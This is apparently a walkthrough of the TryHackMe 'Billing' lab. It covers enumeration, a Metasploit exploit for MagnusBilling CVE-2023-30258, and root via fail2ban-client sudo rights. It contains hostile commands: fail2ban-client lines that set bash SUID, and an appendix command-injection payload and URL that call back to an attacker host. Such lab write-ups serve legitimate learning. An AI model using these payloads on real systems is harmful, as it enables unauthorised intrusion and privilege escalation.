+++
tags = ["tryhackme", "easy"]
difficulty = "easy"
date = "2025-07-04"
description = "Billing Writeup"
featured = "/writeups/tryhackme/billing/1.png"
featuredalt = ""
featuredpath = "date"
linktitle = ""
title = "[EASY] Billing"
slug = "billing"
type = "post"
+++

[Link to the room!](https://tryhackme.com/room/billing)

**Note**: Bruteforcing is out of scope for this room.

## Enumeration

To get started, launch an Nmap scan to check for open ports:

```bash
nmap -T5 -sC -sV -oN nmap.log 10.10.125.241
```

![](/writeups/tryhackme/billing/1.webp)

Nmap shows that ports 22, 80 and 3306 are open. Furthermore, on port 3306 we have MariaDB running but we're unauthorized without credentials.

Accessing the web server on port 80 using the browser throws a redirect to a login page on /mbilling:

![](/writeups/tryhackme/billing/2.webp)

The website title says 'MagnusBilling', and checking the source code proves this name is somewhat relevant. Googling it shows that this is an open source VOIP billing solution. 

You'll also find that there's a vulnerability on versions 6 and 7 that allows for unauthenticated RCE (CVE-2023-30258 - the exact workings of the exploit are explored at the end of this writeup). It's also available on metasploit.

## Exploitation

Launching metasploit and searching for 'magnus' shows one result:

![](/writeups/tryhackme/billing/3.webp)

Select it:

![](/writeups/tryhackme/billing/4.webp)

And change the RHOSTS, then set your LHOST and LPORT. Launch and you'll get a shell:

![](/writeups/tryhackme/billing/5.webp)

Now you can get the user flag!

## Privilege Escalation

You can get a shell in meterpreter by typing the 'shell command', and then check what the current can run as sudo:

![](/writeups/tryhackme/billing/6.webp)

Although at the time of writing the fail2ban-client binary is not on GTFOBins, some light Googling shows it's an IDPS that bans IPs trying to perform brute-force attacks (now the message of the room's creator makes more sense)

Some resources suggest exploiting this service by modifying the config files, but in this case we do not possess write privileges over these. After some more Googling, I found [this resource](https://vulners.com/packetstorm/PACKETSTORM:189989).

It's a script that automates privilege escalation using the fail2ban-client, but we can actually pull the commands and perform the privesc manually:

```bash
sudo /usr/bin/fail2ban-client restart
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "chmod +s /bin/bash" 
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```

After restarting the service, banning the ip 127.0.0.1 (localhost) will execute ```chmod +s /bin/bash```, making bash an SUID binary and therefore granting us root!

![](/writeups/tryhackme/billing/7.webp)

## Appendix - Explanation of CVE-2023-30258

The vulnerability exploited is a blind command injection. It occurs on versions 6 through 7.3 (inclusive) of MagnusBilling, and it's actually found in the democ GET parameter inside /mbilling/lib/icepay/icepay.php.

A working payload for a PoC could be the following:

```txt
null;curl $IP; null
```

To test it, we can launch a HTTP server on our attacker host and access the following link:

```txt
http://10.10.125.241/mbilling/lib/icepay/icepay.php?democ=null;curl%2010.9.1.213/poc;null
```

We get a callback:

![](/writeups/tryhackme/billing/8.webp)

[This script](https://github.com/hadrian3689/magnus_billing_rce/blob/main/magnus_rce.py) shows how this exploit could be carried out without making use of Meterpreter.

Furthermore, if we actually dig deep into the 'magnusbilling' GitHub repo, we can check previous versions of the icepay.php and identify the vulnerable code snippet:

```php
    if (isset($_GET['democ'])) {
         if (preg_match('/^[a-f0-9]{32}$/', $_GET['democ'])) {
             exec("touch " . $_GET['democ'] . '.txt');
         } elseif ($_GET['democ'] == '') {
             exec("rm -rf *.txt");
         }
     }
```

The 'democ' parameter is passed unfiltered to 'exec'. A semicolon escapes the 'touch' command, and another one at the end of our payload escapes the '.txt':

```bash
touch null; curl $IP; null .txt
```